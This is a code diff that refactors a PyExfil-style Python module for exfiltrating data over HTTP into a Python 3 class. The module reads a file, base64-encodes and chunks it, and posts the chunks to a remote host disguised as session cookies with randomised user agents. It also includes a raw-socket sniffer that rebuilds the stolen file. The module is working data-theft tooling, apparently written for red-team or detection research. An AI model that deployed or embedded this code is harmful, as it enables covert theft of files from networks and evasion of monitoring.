@@ -1,4 +1,4 @@
-#!/usr/bin/python
+#!/usr/bin/env python3
 
 import os
 import sys
@@ -10,20 +10,25 @@ import random
 import socket
 import requests
 import datetime
-from struct import *
+from struct import unpack
 
+from pyexfil.includes.base import NetworkModule
 
-# Constants
 USER_AGENTS = [
-	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7",
-	"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.6 (Change: )",
-	"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
-	"Mozilla/2.02E (Win95; U)",
-	"Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)",
-	"Opera/7.50 (Windows XP; U)",
-	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/28.0.1469.0 Safari/537.36",
-	"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1"]
-HEADERS = {'content-type': 'application/json', 'User-Agent': random.choice(USER_AGENTS)}
+    "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7",
+    "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.6 (Change: )",
+    "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
+    "Mozilla/2.02E (Win95; U)",
+    "Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)",
+    "Opera/7.50 (Windows XP; U)",
+    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/28.0.1469.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1",
+]
+HEADERS = {
+    'content-type': 'application/json',
+    'User-Agent': random.choice(USER_AGENTS),
+}
+
 READ_BINARY = "rb"
 WRITE_BINARY = "wb"
 LOGFILE_BASENAME = "http_log"
@@ -31,8 +36,6 @@ LOGFILE_EXT = ".txt"
 HTTP_PORT = 80
 ETH_P_ALL = 0x0003
 
-
-# Packet configuration
 INIT_PACKET_COOKIE = "sessionID"
 PACKET_COOKIE = "PHPSESSID"
 TERMINATION_COOKIE = "sessID0"
@@ -40,183 +43,181 @@ COOKIE_DELIMITER = ".."
 DATA_END = "00000000000000"
 
 
-def send_file(addr, file_path, max_packet_size=1200, time_delay=0.05):
-	"""
-	This function will exfiltrate the data given.
-	:param addr: IP or hostname to exfiltrate the data to
-	:param file_path: Path of the file to exfiltrate
-	:param max_packet_size: If not set the max size is 1200
-	:param time_delay: If not set time delay between packets is 0.05 seconds
-	:return:
-	"""
-	try:
-		# Load file
-		fh = open(file_path, READ_BINARY)
-		iAmFile = fh.read()
-		fh.close()
-	except:
-		sys.stderr.write("Error reading file!\n")
-		raise ()
+class HTTPCookieExfil(NetworkModule):
+    MODULE_NAME = "HTTPCookies"
+    PROTOCOL = "http/tcp"
 
-	# Split file to chunks by size:
-	chunks = []
-	IamDone = ""
+    def __init__(self, host, port=HTTP_PORT, enc_key="", packet_delay=0.05,
+                 max_packet_size=1200, verbose=False):
+        super().__init__(host=host, port=port, enc_key=enc_key,
+                         packet_delay=packet_delay,
+                         max_packet_size=max_packet_size, verbose=verbose)
 
-	IamDone = base64.b64encode(iAmFile)                                                         # Base64 Encode for ASCII
-	checksum = zlib.crc32(IamDone)                                                              # Calculate CRC32 for later verification
-	chunks = [IamDone[i:i + max_packet_size] for i in range(0, len(IamDone), max_packet_size)]  # Split into chunks
-	head, tail = os.path.split(file_path)                                                       # Get filename
+    def _send_impl(self, data, **kwargs):
+        file_path = data
+        addr = kwargs.get("addr", "http://%s:%s" % (self.host, self.port))
+        time_delay = kwargs.get("time_delay", self.packet_delay)
+        max_packet_size = kwargs.get("max_packet_size", self.max_packet_size)
 
-	# Initial packet:
-	try:
-		init_payload = tail + COOKIE_DELIMITER + str(checksum) + COOKIE_DELIMITER + str(len(chunks))
-		payload = {INIT_PACKET_COOKIE: init_payload}
-		requests.post(addr, data=json.dumps(payload), headers=HEADERS)
-		sys.stdout.write("[+] Sent initiation package. Total of %s chunks.\n" % (len(chunks) + 2))
-		sys.stdout.write(".")
-		time.sleep(time_delay)
-	except:
-		sys.stderr.write("Unable to reach target with error:\n")
-		sys.exit(1)
+        try:
+            with open(file_path, READ_BINARY) as fh:
+                i_am_file = fh.read()
+        except Exception:
+            sys.stderr.write("Error reading file!\n")
+            raise
 
-	# Send data
-	current_chunk = 0
-	for chunk in chunks:
-		payload = {PACKET_COOKIE + str(current_chunk): chunk}
-		requests.post(addr, data=json.dumps(payload), headers=HEADERS)
-		current_chunk += 1
-		sys.stdout.write(".")
-		time.sleep(time_delay)
-	sys.stdout.write(".\n")
+        i_am_done = base64.b64encode(i_am_file)
+        checksum = zlib.crc32(i_am_done)
+        chunks = [i_am_done[i:i + max_packet_size]
+                  for i in range(0, len(i_am_done), max_packet_size)]
+        head, tail = os.path.split(file_path)
 
-	# Termination packet
-	data = DATA_END + str(current_chunk)
-	payload = {TERMINATION_COOKIE: data}
-	requests.post(addr, data=json.dumps(payload), headers=HEADERS)
-	sys.stdout.write("[+] Sent termination packets and total of %s packets.\n" % current_chunk)
+        try:
+            init_payload = (tail + COOKIE_DELIMITER + str(checksum)
+                            + COOKIE_DELIMITER + str(len(chunks)))
+            payload = {INIT_PACKET_COOKIE: init_payload}
+            requests.post(addr, data=json.dumps(payload), headers=HEADERS)
+            sys.stdout.write("[+] Sent initiation package. Total of %s chunks.\n"
+                             % (len(chunks) + 2))
+            time.sleep(time_delay)
+        except Exception:
+            sys.stderr.write("Unable to reach target.\n")
+            return False
 
-	return 0
+        current_chunk = 0
+        for chunk in chunks:
+            chunk_str = chunk.decode() if isinstance(chunk, bytes) else chunk
+            payload = {PACKET_COOKIE + str(current_chunk): chunk_str}
+            requests.post(addr, data=json.dumps(payload), headers=HEADERS)
+            current_chunk += 1
+            time.sleep(time_delay)
 
+        term_data = DATA_END + str(current_chunk)
+        payload = {TERMINATION_COOKIE: term_data}
+        requests.post(addr, data=json.dumps(payload), headers=HEADERS)
+        sys.stdout.write("[+] Sent termination packets and total of %s packets.\n"
+                         % current_chunk)
+        return True
 
-def listen(local_addr, local_port=80):
-	"""
-	This function will initiate a web listener (NOT SERVER!) on default port 80.
-	It will then capture files and save them into a local file.
-	:param local_addr: The ip address to bind to.
-	:param local_port: The port. If not mentioned, 80 will be chosen.
-	:return:
-	"""
-	def eth_addr(a):
-		b = "%.2x:%.2x:%.2x:%.2x:%.2x:%.2x" % (ord(a[0]), ord(a[1]), ord(a[2]), ord(a[3]), ord(a[4]), ord(a[5]))
-		return b
+    def _listen_impl(self, callback, **kwargs):
+        # AF_PACKET is Linux-only — this listener requires Linux
+        local_addr = kwargs.get("addr", self.host)
 
-	try:
-		s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(ETH_P_ALL))
-	except socket.error, msg:
-		sys.stderr.write('Socket could not be created. Error Code : ' + str(msg[0]) + ' Message ' + msg[1] + "\n")
-		raise ()
+        def eth_addr(a):
+            b = "%.2x:%.2x:%.2x:%.2x:%.2x:%.2x" % (
+                a[0], a[1], a[2], a[3], a[4], a[5]
+            )
+            return b
 
-	try:
-		# Initiate log file:
-		current_time_as_string = str(datetime.datetime.now()).replace(":", ".").replace(" ", "-")[:-7]
-		log_fh = open(LOGFILE_BASENAME + current_time_as_string + LOGFILE_EXT, WRITE_BINARY)
-		log_fh.write("Started logging at %s\n\n" % current_time_as_string)
+        try:
+            s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW,
+                               socket.ntohs(ETH_P_ALL))
+        except socket.error as msg:
+            sys.stderr.write(
+                'Socket could not be created. Error Code: '
+                + str(msg.args[0]) + ' Message ' + str(msg.args[1]) + "\n"
+            )
+            raise
 
-	except:
-		sys.stderr.write("Error starting log file.\n")
-		raise ()
+        try:
+            current_time_as_string = (
+                str(datetime.datetime.now()).replace(":", ".").replace(" ", "-")[:-7]
+            )
+            log_fh = open(LOGFILE_BASENAME + current_time_as_string + LOGFILE_EXT,
+                          WRITE_BINARY)
+            log_fh.write(
+                ("Started logging at %s\n\n" % current_time_as_string).encode()
+            )
+        except Exception:
+            sys.stderr.write("Error starting log file.\n")
+            raise
 
-	# Main work starts here
-	while True:
-		packet, address = s.recvfrom(65565)
-		eth_length = 14
+        filename = None
+        crc = None
+        recvd_data = b""
+        fh = None
 
-		eth_header = packet[:eth_length]
-		eth = unpack('!6s6sH', eth_header)
-		eth_protocol = socket.ntohs(eth[2])
+        while not self._stop_event.is_set():
+            packet, address = s.recvfrom(65565)
+            eth_length = 14
 
-		# Parse IP packets, IP Protocol number = 8
-		if eth_protocol == 8 and address[2] == 4: # Cancel out duplicates
-			# Parse IP header
-			ip_header = packet[eth_length:20 + eth_length]  # 20 first chars are IP Header
-			iph = unpack('!BBHHHBBH4s4s', ip_header)  # Unpacking IP Header
+            eth_header = packet[:eth_length]
+            eth = unpack('!6s6sH', eth_header)
+            eth_protocol = socket.ntohs(eth[2])
 
-			version_ihl = iph[0]
-			version = version_ihl >> 4
-			ihl = version_ihl & 0xF
-			iph_length = ihl * 4
-			ttl = iph[5]
-			protocol = iph[6]
-			s_addr = socket.inet_ntoa(iph[8])
-			d_addr = socket.inet_ntoa(iph[9])
+            if eth_protocol == 8 and address[2] == 4:
+                ip_header = packet[eth_length:20 + eth_length]
+                iph = unpack('!BBHHHBBH4s4s', ip_header)
 
-			# TCP protocol
-			# Todo; later add the option to choose a port
-			if protocol == 6:
-				t = iph_length + eth_length  # Add IP header and Ethernet header
-				tcp_header = packet[t:t + 20]  # TCP header = 20 chars
-				tcph = unpack('!HHLLBBHHH', tcp_header)  # Unpack it
+                version_ihl = iph[0]
+                ihl = version_ihl & 0xF
+                iph_length = ihl * 4
+                protocol = iph[6]
+                s_addr = socket.inet_ntoa(iph[8])
 
-				source_port = tcph[0]
-				dest_port = tcph[1]
-				sequence = tcph[2]
-				acknowledgement = tcph[3]
-				doff_reserved = tcph[4]
-				tcph_length = doff_reserved >> 4
+                if protocol == 6:
+                    t = iph_length + eth_length
+                    tcp_header = packet[t:t + 20]
+                    tcph = unpack('!HHLLBBHHH', tcp_header)
 
-				if (dest_port == HTTP_PORT) or (source_port == HTTP_PORT):
-					filename = "dfbsdgbSFGBSbSRTBsrthbSFGNsrHS$5h"      # random just to make sure no match.
-					# Get the actual data
-					h_size = eth_length + iph_length + tcph_length * 4
-					data_size = len(packet) - h_size
-					data = packet[h_size:]
+                    source_port = tcph[0]
+                    dest_port = tcph[1]
+                    doff_reserved = tcph[4]
+                    tcph_length = doff_reserved >> 4
 
-					if data.find(INIT_PACKET_COOKIE) != -1:
-						data_init_offset = data.find(INIT_PACKET_COOKIE)
-						viable_data = data[data_init_offset:]                                           # Getting right line
-						filename = viable_data[viable_data.find("\": \"") + 4:viable_data.find("..")]   # getting filename
-						viable_data = viable_data[viable_data.find("..") + 2:]                          # trim it
-						crc = viable_data[:viable_data.find("..")]                                      # Getting CRC
-						viable_data = viable_data[viable_data.find("..") + 2:]                          # trim it
-						total_packets = viable_data[:viable_data.find("\"}")]                           # Getting packet amount
+                    if (dest_port == HTTP_PORT) or (source_port == HTTP_PORT):
+                        h_size = eth_length + iph_length + tcph_length * 4
+                        data = packet[h_size:]
 
-						# Print user friendly information
-						log_fh.write("Got initiation packet from " + str(s_addr) + ".\n")
-						log_fh.write("Will now initiate capturing of: \n")
-						log_fh.write("\t\tFilename:\t%s\n" % filename)
-						log_fh.write("\t\tCRC32:\t\t%s\n" % crc)
-						log_fh.write("\t\tTotal Packets:\t%s\n" % total_packets)
-						log_fh.write("\t\tOrigin IP:\t%s\n" % s_addr)
+                        init_key = INIT_PACKET_COOKIE.encode()
+                        term_key = TERMINATION_COOKIE.encode()
+                        pkt_key = PACKET_COOKIE.encode()
 
-						# Set up for file writing
-						data_packets_recvd = 0
-						fh = open(filename + "_" + crc, WRITE_BINARY)
-						recvd_data = ""
+                        if init_key in data:
+                            data_init_offset = data.find(init_key)
+                            viable_data = data[data_init_offset:]
+                            sep = b"\": \""
+                            filename_b = viable_data[viable_data.find(sep) + len(sep):
+                                                     viable_data.find(b"..")]
+                            filename = filename_b.decode(errors="replace")
+                            viable_data = viable_data[viable_data.find(b"..") + 2:]
+                            crc = viable_data[:viable_data.find(b"..")].decode()
+                            viable_data = viable_data[viable_data.find(b"..") + 2:]
+                            total_packets = viable_data[:viable_data.find(b"\"}")]
 
-					# Found termination
-					elif data.find(TERMINATION_COOKIE) != -1:
-						log_fh.write("Termination from: %s\n" % s_addr)
-						if zlib.crc32(recvd_data) == int(crc):
-							# CRC32 is matched. Continuing to decryption and file saving
-							recvd_data = base64.b64decode(recvd_data)
-							fh.write(recvd_data)
-							fh.close()
-							log_fh.write("[+] File has been created and saved as " + str(filename) + "_" + str(crc) + "\n")
-						else:
-							sys.stderr.write("[!] No CRC match! Will not be writing file.\n")
+                            log_fh.write(("Got initiation packet from " + str(s_addr) + ".\n").encode())
+                            log_fh.write(("Filename: %s\n" % filename).encode())
+                            log_fh.write(("CRC32: %s\n" % crc).encode())
+                            log_fh.write(("Origin IP: %s\n" % s_addr).encode())
 
-					# Found regular data
-					elif data.find(PACKET_COOKIE) != -1:
-						data_init_offset = data.find(PACKET_COOKIE)
-						viable_data = data[data_init_offset:]  # Getting right line
-						viable_data = viable_data[viable_data.find("\": \"") + 4:viable_data.find("\"}")]
-						recvd_data += viable_data
-						data_packets_recvd += 1
-						sys.stdout.write(str(data_packets_recvd) + "-")
-					else:
-						# Must be regular HTTP request
-						pass
+                            fh = open(filename + "_" + crc, WRITE_BINARY)
+                            recvd_data = b""
+
+                        elif term_key in data:
+                            log_fh.write(("Termination from: %s\n" % s_addr).encode())
+                            if zlib.crc32(recvd_data) == int(crc):
+                                decoded = base64.b64decode(recvd_data)
+                                if fh:
+                                    fh.write(decoded)
+                                    fh.close()
+                                log_fh.write(
+                                    ("[+] File saved as " + filename + "_" + crc + "\n").encode()
+                                )
+                                meta = {"addr": address, "file": filename}
+                                callback(decoded, meta)
+                            else:
+                                sys.stderr.write("[!] No CRC match! Will not write file.\n")
+
+                        elif pkt_key in data:
+                            data_init_offset = data.find(pkt_key)
+                            viable_data = data[data_init_offset:]
+                            sep = b"\": \""
+                            chunk = viable_data[viable_data.find(sep) + len(sep):
+                                                viable_data.find(b"\"}")]
+                            recvd_data += chunk
 
 
 if __name__ == "__main__":
-	sys.stdout.write("This is meant to be a module for python and not a stand alone executable\n")
+    sys.stdout.write(
+        "This is meant to be a module for python and not a stand alone executable\n"
+    )
